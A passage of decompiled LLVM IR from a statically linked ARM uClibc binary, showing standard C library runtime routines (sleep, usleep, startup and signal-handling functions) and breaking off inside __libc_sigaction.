  %v5_1348018 = phi i32 [ %v5_1348017, %dec_label_pc_13478.preheader ], [ %v5_13480, %dec_label_pc_13470 ]
  %v2_13474 = add i32 %v5_1348018, -136
  %v3_13474 = inttoptr i32 %v2_13474 to i32*
  store i32 0, i32* %v3_13474, align 4
  %v0_13478.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13478 = add i32 %v0_13478.pre, -1
  store i32 %v1_13478, i32* %r1.global-to-local, align 4
  %v6_13478 = icmp slt i32 %v1_13478, 0
  %v4_13480 = mul i32 %v1_13478, 4
  %v5_13480 = add i32 %v4_13480, %v16_13458
  br i1 %v6_13478, label %dec_label_pc_13488, label %dec_label_pc_13470

dec_label_pc_13488:                               ; preds = %dec_label_pc_13470
  %v2_13488 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_13488, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13498 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_13498, i32* %stack_var_-28, align 4
  %v0_134a0 = call i32 @__sigaddset()
  store i32 %v0_134a0, i32* %r0.global-to-local, align 4
  %v1_134a4 = load i32, i32* @r5, align 4
  %v5_134a8 = icmp slt i32 %v0_134a0, %v1_134a4
  br i1 %v5_134a8, label %dec_label_pc_135ec, label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_13488
  %v2_134ac = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_134ac, i32* @r4, align 4
  store i32 %v1_134a4, i32* %r0.global-to-local, align 4
  store i32 %v2_13488, i32* %r1.global-to-local, align 4
  %v3_134bc = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_134bc = call i32 @__GI_sigprocmask(i32 %v1_134a4, %_TYPEDEF_sigset_t* %v3_134bc, i32 %v2_134ac)
  store i32 %v4_134bc, i32* %r0.global-to-local, align 4
  %v1_134c0 = load i32, i32* @r5, align 4
  %v9_134c0 = icmp eq i32 %v4_134bc, %v1_134c0
  br i1 %v9_134c0, label %dec_label_pc_134c8, label %dec_label_pc_135ec

dec_label_pc_134c8:                               ; preds = %dec_label_pc_134ac
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_134ac, i32* %r0.global-to-local, align 4
  %v2_134d0 = call i32 @__sigismember(i32 %v2_134ac, i32 17)
  store i32 %v2_134d0, i32* %r0.global-to-local, align 4
  %v1_134d4 = load i32, i32* @r5, align 4
  %v9_134d4 = icmp eq i32 %v2_134d0, %v1_134d4
  br i1 %v9_134d4, label %dec_label_pc_134ec.preheader, label %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge

dec_label_pc_134c8.dec_label_pc_135b4_crit_edge:  ; preds = %dec_label_pc_134c8
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_135b4

dec_label_pc_134ec.preheader:                     ; preds = %dec_label_pc_134c8
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134ec.preheader, %dec_label_pc_134e4
  %v5_134f416 = phi i32 [ %v5_1348017, %dec_label_pc_134ec.preheader ], [ %v5_134f4, %dec_label_pc_134e4 ]
  %v2_134e8 = add i32 %v5_134f416, -136
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  store i32 0, i32* %v3_134e8, align 4
  %v0_134ec.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_134ec = add i32 %v0_134ec.pre, -1
  store i32 %v1_134ec, i32* %r1.global-to-local, align 4
  %v6_134ec = icmp slt i32 %v1_134ec, 0
  %v4_134f4 = mul i32 %v1_134ec, 4
  %v5_134f4 = add i32 %v4_134f4, %v16_13458
  br i1 %v6_134ec, label %dec_label_pc_134fc, label %dec_label_pc_134e4

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134e4
  store i32 %v2_13488, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13504 = call i32 @__sigaddset()
  store i32 %v0_13504, i32* %r0.global-to-local, align 4
  %v1_13508 = icmp slt i32 %v0_13504, 0
  br i1 %v1_13508, label %dec_label_pc_135ec, label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_134fc
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1351c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_13460)
  store i32 %v4_1351c, i32* %r0.global-to-local, align 4
  %v1_13520 = icmp slt i32 %v4_1351c, 0
  br i1 %v1_13520, label %dec_label_pc_13528, label %dec_label_pc_13550

dec_label_pc_13528:                               ; preds = %dec_label_pc_13510
  %v0_13528 = call i32 @__errno_location()
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 %v0_13528, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1353c = inttoptr i32 %v0_13528 to i32*
  %v2_1353c = load i32, i32* %v1_1353c, align 4
  store i32 %v2_1353c, i32* @r4, align 4
  %v3_13540 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13540 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_13540, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_13548 = load i32, i32* @r4, align 4
  %v1_13548 = load i32, i32* %r5.global-to-local, align 4
  %v2_13548 = inttoptr i32 %v1_13548 to i32*
  store i32 %v0_13548, i32* %v2_13548, align 4
  %v17_135f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_13550:                               ; preds = %dec_label_pc_13510
  %v2_13550 = load i32, i32* %stack_var_-424, align 4
  %v7_13554 = icmp eq i32 %v2_13550, 1
  %v2_1355c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1355c, i32* @r4, align 4
  br i1 %v7_13554, label %dec_label_pc_13564, label %dec_label_pc_13598

dec_label_pc_13564:                               ; preds = %dec_label_pc_13550
  store i32 %v2_1355c, i32* %r1.global-to-local, align 4
  store i32 %v2_1355c, i32* %r0.global-to-local, align 4
  %v2_1356c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1356c = call i32 @__libc_nanosleep(%timespec* %v2_1356c, i32 %v2_1355c)
  store i32 %v3_1356c, i32* %r0.global-to-local, align 4
  store i32 %v3_1356c, i32* %r6.global-to-local, align 4
  %v0_13574 = call i32 @__errno_location()
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 %v0_13574, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_13588 = inttoptr i32 %v0_13574 to i32*
  %v2_13588 = load i32, i32* %v1_13588, align 4
  store i32 %v2_13588, i32* @r4, align 4
  %v3_1358c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_1358c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_1358c, i32 0)
  store i32 %v4_1358c, i32* %r0.global-to-local, align 4
  %v0_13590 = load i32, i32* @r4, align 4
  %v1_13590 = load i32, i32* %r5.global-to-local, align 4
  %v2_13590 = inttoptr i32 %v1_13590 to i32*
  store i32 %v0_13590, i32* %v2_13590, align 4
  %v0_135c0.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_13598:                               ; preds = %dec_label_pc_13550
  store i32 %v2_134ac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_135a4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_135a4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_135a4, i32 0)
  store i32 %v4_135a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135b4

dec_label_pc_135b4:                               ; preds = %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge, %dec_label_pc_13598
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_134c8.dec_label_pc_135b4_crit_edge ], [ %v2_1355c, %dec_label_pc_13598 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_135b8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_135b8 = call i32 @__libc_nanosleep(%timespec* %v2_135b8, i32 %storemerge.pre-phi)
  store i32 %v3_135b8, i32* %r0.global-to-local, align 4
  store i32 %v3_135b8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13564, %dec_label_pc_135b4
  %v0_135c0 = phi i32 [ %v0_135c0.pr, %dec_label_pc_13564 ], [ %v3_135b8, %dec_label_pc_135b4 ]
  %v2_135c0 = icmp eq i32 %v0_135c0, 0
  br i1 %v2_135c0, label %dec_label_pc_135e4, label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c0
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_135d0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_135d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135e4:                               ; preds = %entry, %dec_label_pc_135c0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135ec:                               ; preds = %dec_label_pc_134ac, %dec_label_pc_134fc, %dec_label_pc_13488
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135c8, %dec_label_pc_135e4, %dec_label_pc_13528, %dec_label_pc_135ec
  %v17_135f4 = phi i32 [ %v3_135d0, %dec_label_pc_135c8 ], [ 0, %dec_label_pc_135e4 ], [ %v17_135f4.pre, %dec_label_pc_13528 ], [ -1, %dec_label_pc_135ec ]
  %v2_135f4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_135f4, i32* @r4, align 4
  store i32 %v6_13458, i32* @r5, align 4
  store i32 %v9_13458, i32* @r6, align 4
  ret i32 %v17_135f4

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1355c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_134ec, { 0, 2, 1 }
  uselistorder i32 %v2_134ac, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_134a4, { 1, 0, 2 }
  uselistorder i32 %v1_13478, { 0, 2, 1 }
  uselistorder i32 %v16_13458, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_135f0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_135ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135e4, { 1, 0 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
  uselistorder label %dec_label_pc_135b4, { 1, 0 }
  uselistorder label %dec_label_pc_134e4, { 1, 0 }
  uselistorder label %dec_label_pc_13470, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_135fc = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_13610 = udiv i32 %arg1, 1000000
  store i32 %v2_13610, i32* %stack_var_-20, align 4
  %v2_13638 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_13638 = call i32 @__libc_nanosleep(%timespec* %v2_13638, i32 0)
  store i32 %v3_135fc, i32* @r4, align 4
  ret i32 %v3_13638

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_13674:
  %stack_var_-8 = alloca i32, align 4
  %v3_13648 = load i32, i32* @r4, align 4
  store i32 %v3_13648, i32* %stack_var_-8, align 4
  %v2_13678 = load i32, i32* @global_var_29778.526, align 4
  %v2_1367c = icmp eq i32 %v2_13678, 0
  br i1 %v2_1367c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13674
  call void @__pseudo_branch(i32 %v2_13678)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13674, %bb
  %v2_1368c = load i32, i32* @global_var_2977c.528, align 4
  %v2_13690 = icmp eq i32 %v2_1368c, 0
  br i1 %v2_13690, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_13694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_13694, i32* @r4, align 4
  %v9_13694 = load i32, i32* @r0, align 4
  ret i32 %v9_13694

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_1368c)
  %v2_136a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136a0, i32* @r4, align 4
  %v8_136a0 = load i32, i32* @r0, align 4
  ret i32 %v8_136a0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_136bc = load i32, i32* @r0, align 4
  ret i32 %v1_136bc
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_136c0 = load i32, i32* @r4, align 4
  store i32 %v3_136c0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_136d0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_136d4 = icmp eq i32 %v2_136d0, -1
  br i1 %v7_136d4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_136d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_136d8, i32* @r4, align 4
  ret i32 %v2_136d0

bb4:                                              ; preds = %entry
  %v0_136dc = load i32, i32* @r4, align 4
  %v4_136e4 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ab4c.531, i32 0, i32 0), i32 %v0_136dc)
  %v1_136e8 = load i32, i32* %r5.global-to-local, align 4
  %v9_136e8 = icmp eq i32 %v4_136e4, %v1_136e8
  br i1 %v9_136e8, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_136ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_136ec, i32* @r4, align 4
  ret i32 %v4_136e4

bb6:                                              ; preds = %bb4
  %v0_136f0 = call i32 @abort()
  %v0_136f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_136f4, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_136f0

; uselistorder directives
  uselistorder i32 %v2_136d0, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_136fc = load i32, i32* @global_var_29780.533, align 4
  %v2_13700 = icmp eq i32 %v2_136fc, 0
  br i1 %v2_13700, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1370c = load i32, i32* @r0, align 4
  ret i32 %v6_1370c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_29780.533, align 4
  store i32 4096, i32* @global_var_29774.293, align 4
  %v0_13740 = call i32 @_stdio_init()
  ret i32 %v0_13740
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_13758 = mul i32 %arg2, 4
  %v5_13758 = add i32 %tmp, %v4_13758
  %v2_1375c = load i32, i32* %arg3, align 4
  %v2_13760 = ptrtoint i32* %stack_var_-120 to i32
  %v1_13764 = add i32 %v5_13758, 4
  %v9_13768 = icmp eq i32 %v1_13764, %v2_1375c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2976c.539, align 4
  store i32 %v1_13764, i32* @global_var_29770.519, align 4
  store i32 %arg6, i32* @global_var_2977c.528, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_13768, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_13758, i32* @global_var_29770.519, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_137a8 = bitcast i32* %stack_var_-120 to i8*
  %v3_137a8 = call i32 @__GI_memset(i8* %v2_137a8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_29770.519, align 4
  br label %dec_label_pc_137b8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_137b8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_137b8, %dec_label_pc_137b8 ]
  %v1_137b8 = inttoptr i32 %storemerge to i32*
  %v2_137b8 = load i32, i32* %v1_137b8, align 4
  %v4_137b8 = add i32 %storemerge, 4
  %v2_137bc = icmp eq i32 %v2_137b8, 0
  br i1 %v2_137bc, label %dec_label_pc_137c8, label %dec_label_pc_137b8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137b8
  store i32 %v4_137b8, i32* @r4, align 4
  %v1_137e822 = inttoptr i32 %v4_137b8 to i32*
  %v2_137e823 = load i32, i32* %v1_137e822, align 4
  %v2_137ec25 = icmp eq i32 %v2_137e823, 0
  br i1 %v2_137ec25, label %dec_label_pc_137f4, label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137c8, %dec_label_pc_137e8
  %v5_137d4 = phi i32 [ %v2_137e8, %dec_label_pc_137e8 ], [ %v2_137e823, %dec_label_pc_137c8 ]
  %v2_137d0 = icmp ugt i32 %v5_137d4, 13
  %v7_137d0 = icmp eq i32 %v5_137d4, 14
  %v2_137d4 = xor i1 %v2_137d0, true
  %v3_137d4 = or i1 %v7_137d0, %v2_137d4
  br i1 %v3_137d4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_137d0
  %v6_137d4 = and i32 %v5_137d4, 536870912
  %v7_137d4 = icmp ne i32 %v6_137d4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_137d0, %bb42
  %v1_137e0 = phi i1 [ %v2_137d0, %dec_label_pc_137d0 ], [ %v7_137d4, %bb42 ]
  %v2_137d8 = xor i1 %v1_137e0, true
  %v3_137d8 = or i1 %v7_137d0, %v2_137d8
  br i1 %v3_137d8, label %bb44, label %dec_label_pc_137e8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_137d8, i32 ptrtoint ([3 x i8]* @global_var_11650.542 to i32))
  %v0_137e4 = load i32, i32* @r4, align 4
  %v1_137e4 = add i32 %v0_137e4, 8
  store i32 %v1_137e4, i32* @r4, align 4
  %v1_137e8 = inttoptr i32 %v1_137e4 to i32*
  %v2_137e8 = load i32, i32* %v1_137e8, align 4
  %v2_137ec = icmp eq i32 %v2_137e8, 0
  br i1 %v2_137ec, label %dec_label_pc_137f4, label %dec_label_pc_137d0

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137e8, %dec_label_pc_137c8
  %v1_137f8 = call i32 @_dl_aux_init(i32 %v2_13760)
  store i32 %v1_137f8, i32* @r0, align 4
  %v1_137fc = call i32 @__GI___uClibc_init(i32 %v1_137f8)
  store i32 %v1_137fc, i32* @r0, align 4
  %v2_13808 = icmp eq i32 %tmp37, 0
  br i1 %v2_13808, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_137f4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_137f4, %bb45
  %v0_13818 = phi i32 [ %tmp37, %dec_label_pc_137f4 ], [ 4096, %bb45 ]
  %v3_13810 = icmp eq i32 %tmp36, -1
  %v8_13810 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_29774.293 to i32), i32* @r2, align 4
  store i32 %v0_13818, i32* @global_var_29774.293, align 4
  br i1 %v3_13810, label %dec_label_pc_13820, label %dec_label_pc_13848

dec_label_pc_13820:                               ; preds = %bb46
  %v0_13820 = call i32 @getuid()
  store i32 %v0_13820, i32* @r0, align 4
  store i32 %v0_13820, i32* @r4, align 4
  %v0_13828 = call i32 @geteuid()
  %v0_1382c = load i32, i32* @r4, align 4
  %v9_1382c = icmp eq i32 %v0_1382c, %v0_13828
  br i1 %v9_1382c, label %dec_label_pc_13834, label %dec_label_pc_13870

dec_label_pc_13834:                               ; preds = %dec_label_pc_13820
  %v1_13834 = call i32 @getgid(i32 %v0_13828)
  store i32 %v1_13834, i32* @r0, align 4
  store i32 %v1_13834, i32* @r4, align 4
  %v0_1383c = call i32 @getegid()
  %v0_13840 = load i32, i32* @r4, align 4
  %v9_13840 = icmp eq i32 %v0_13840, %v0_1383c
  br i1 %v9_13840, label %dec_label_pc_13848, label %dec_label_pc_13870

dec_label_pc_13848:                               ; preds = %dec_label_pc_13834, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_13810, label %dec_label_pc_138dc, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13848
  %v9_13858 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_13858, label %dec_label_pc_13860, label %dec_label_pc_13870

dec_label_pc_13860:                               ; preds = %dec_label_pc_13854
  br label %dec_label_pc_13870

dec_label_pc_13870:                               ; preds = %dec_label_pc_13860, %dec_label_pc_13854, %dec_label_pc_13834, %dec_label_pc_13820
  %v2_13878 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_13884 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_13890 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_13870, %dec_label_pc_13848
  %v0_138a0 = load i32, i32* @r6, align 4
  %v1_138a0 = inttoptr i32 %v0_138a0 to i32*
  %v2_138a0 = load i32, i32* %v1_138a0, align 4
  store i32 %v2_138a0, i32* @global_var_234e4, align 4
  store i32 %arg5, i32* @global_var_29778.526, align 4
  %v2_138dc = icmp eq i32 %arg4, 0
  br i1 %v2_138dc, label %dec_label_pc_13918, label %bb47

bb47:                                             ; preds = %dec_label_pc_138dc
  br label %dec_label_pc_13918

dec_label_pc_13918:                               ; preds = %dec_label_pc_138dc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_13928 = call i32 @__errno_location()
  %v2_13930 = inttoptr i32 %v1_13928 to i32*
  store i32 0, i32* %v2_13930, align 4
  %v1_13944 = call i32 @__GI___h_errno_location()
  %v2_1394c = inttoptr i32 %v1_13944 to i32*
  store i32 0, i32* %v2_1394c, align 4
  %v0_1395c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13968 = call i32 @__GI_exit(i32 %v0_1395c)
  ret i32 %v1_13968

; uselistorder directives
  uselistorder i32 %v2_137e8, { 1, 0 }
  uselistorder i32 %v1_137e4, { 1, 0 }
  uselistorder i1 %v2_137d0, { 1, 0 }
  uselistorder i32 %v4_137b8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_29774.293, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13918, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_137e8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_137d0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_139a0 = load i32, i32* @r4, align 4
  %v6_139a0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_139a4 = icmp eq i32* %arg2, null
  %v2_139a8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_139a4, label %dec_label_pc_13a14, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %entry
  %v2_139bc = load i32, i32* %arg2, align 4
  %v4_139bc = add i32 %tmp, 4
  store i32 %v4_139bc, i32* @r1, align 4
  %v2_139c0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_139c0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_139bc, i32* %stack_var_-156, align 4
  %v0_139cc = call i32 @memcpy()
  store i32 %v0_139cc, i32* %r0.global-to-local, align 4
  %v0_139d0 = load i32, i32* @r4, align 4
  %v1_139d0 = add i32 %v0_139d0, 132
  %v2_139d0 = inttoptr i32 %v1_139d0 to i32*
  %v3_139d0 = load i32, i32* %v2_139d0, align 4
  %v1_139d4 = and i32 %v3_139d0, 67108864
  %v2_139d4 = icmp eq i32 %v1_139d4, 0
  br i1 %v2_139d4, label %dec_label_pc_139e8, label %bb

bb:                                               ; preds = %dec_label_pc_139b8
  br label %dec_label_pc_13a04

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139b8
  %v1_139f0 = and i32 %v3_139d0, 4
  %v2_139f0 = icmp eq i32 %v1_139f0, 0
  br i1 %v2_139f0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_139e8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_139e8, %bb20
  br label %dec_label_pc_13a04

dec_label_pc_13a04:                               ; preds = %bb, %bb21
  %v2_13a04 = icmp eq i32 %v0_139d0, 0
  %v3_13a08 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13a08 = select i1 %v2_13a04, i32 0, i32 %v3_13a08
  %v0_13a14.pre = load i32, i32* @r5, align 4
  %v0_13a24.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a14

dec_label_pc_13a14:                               ; preds = %dec_label_pc_13a04, %entry
  %v0_13a24 = phi i32 [ %arg1, %entry ], [ %v0_13a24.pre, %dec_label_pc_13a04 ]
  %v0_13a14 = phi i32 [ %arg3, %entry ], [ %v0_13a14.pre, %dec_label_pc_13a04 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_13a08, %dec_label_pc_13a04 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_13a14 = icmp eq i32 %v0_13a14, 0
  %.v2_139a8 = select i1 %v2_13a14, i32 0, i32 %v2_139a8
  store i32 %.v2_139a8, i32* @r2, align 4
  store i32 %v0_13a24, i32* %r0.global-to-local, align 4
  %v1_13a28 = call i32 @__syscall_rt_sigaction(i32 %v0_13a24)
  store i32 %v1_13a28, i32* %r0.global-to-local, align 4
  %v0_13a2c = load i32, i32* @r5, align 4
  %v2_13a2c = icmp eq i32 %v0_13a2c, 0
  br i1 %v2_13a2c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13a14
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13a14, %bb25
  %v0_13a3c.pr = phi i32 [ 0, %dec_label_pc_13a14 ], [ 1, %bb25 ]
  %v1_13a34 = icmp slt i32 %v1_13a28, 0
  br i1 %v1_13a34, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_13a70

thread-pre-split:                                 ; preds = %bb26
  %v2_13a3c = icmp eq i32 %v0_13a3c.pr, 0
  store i32 %v1_13a28, i32* @r4, align 4
  br i1 %v2_13a3c, label %dec_label_pc_13a70, label %dec_label_pc_13a48

dec_label_pc_13a48:                               ; preds = %thread-pre-split
